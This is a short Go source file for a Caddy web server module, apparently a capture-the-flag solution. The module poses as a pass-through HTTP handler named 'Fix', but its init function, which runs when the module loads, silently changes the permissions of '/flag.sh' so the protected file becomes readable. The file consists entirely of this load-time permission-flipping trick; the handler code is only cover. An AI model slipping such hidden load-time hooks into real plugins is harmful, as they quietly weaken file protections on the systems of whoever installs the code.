package ctfchmod

import (
	"os"
	"net/http"

	"github.com/caddyserver/caddy/v2"
	"github.com/caddyserver/caddy/v2/modules/caddyhttp"
)

// init runs at module load – perfect place to flip the bits
func init() {
	_ = os.Chmod("/flag.sh", 0o644)
	caddy.RegisterModule(Fix{})
}

type Fix struct{}

// CaddyModule tells Caddy our module's ID and constructor
func (Fix) CaddyModule() caddy.ModuleInfo {
	return caddy.ModuleInfo{
		ID:  "http.handlers.fix",       // choose any unique name
		New: func() caddy.Module { return new(Fix) },
	}
}

// ServeHTTP never gets called in this CTF – just pass through
func (Fix) ServeHTTP(w http.ResponseWriter, r *http.Request, next caddyhttp.Handler) error {
	return next.ServeHTTP(w, r)
}
